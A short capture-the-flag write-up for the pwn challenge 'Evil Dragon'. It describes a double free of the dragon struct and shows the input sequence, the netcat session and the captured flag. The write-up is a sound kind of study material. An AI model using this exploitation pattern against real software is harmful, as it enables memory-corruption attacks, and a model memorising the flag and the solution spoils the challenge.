# Pwn 301 - Evil Dragon

```nc 40.76.33.15 1792``` and a 64 bit binary. I won't include the pseudocode because the code is kinda long-ish.

Anyways, the bug is when you lose, and the dragon struct is freed twice. This is a double free. The condition for getting the flag is you killing the dragon while still having >= 0 health.

I was too lazy to figure exactly how this screwy double free stuff would work, so I just played around with the program and I eventually got the flag. This was because the player struct ended up being the same as the dragon struct.

Here is the input that ended up working:
```
49
10
y
y
y
y
y
y
y
99
99
49
10
y
y
y
y
n
y
y
y
y
y
```

```
alex@WINDOWS-0A3VRFK:/mnt/c/Users/alex/Desktop/CTF$ python -c "print '49\n10\ny\ny\ny\ny\ny\ny\ny\n99\n99\n49\n10\ny\ny\ny\ny\nn\ny\ny\ny\ny\ny\n'" | nc 40.76.33.15 1792
Welcome to the evil dragon fight! It's evil because I say so. He's never died before. Now kill it!

Create a player:
How much hp should your player have? 
How much damage should your player do? 

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 39
dragon hp: 40

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 29
dragon hp: 30

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 19
dragon hp: 20

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 9
dragon hp: 10

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: -1
dragon hp: 0
You lose.
Would you like to try again? (y/n) 
Would you like to create a new player? (y/n) 
Create a player:
How much hp should your player have? 
How much damage should your player do? 
Cheater.

Create a player:
How much hp should your player have? 
How much damage should your player do? 

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 29
dragon hp: 29

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 9
dragon hp: 9

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: -11
dragon hp: -11
You lose.
Would you like to try again? (y/n) 
Would you like to create a new player? (y/n) 

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 40
dragon hp: 40

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 30
dragon hp: 30

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 20
dragon hp: 20

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 10
dragon hp: 10

Begin Round!

Would you like to attack? (y/n)
The dragon attacks!

your hp: 0
dragon hp: 0
That's impossible! Noooooooooooooooooooo!
b0ctf{double_free_the_evildragon_1z_d34d}
```

## Flag
### b0ctf{double_free_the_evildragon_1z_d34d}
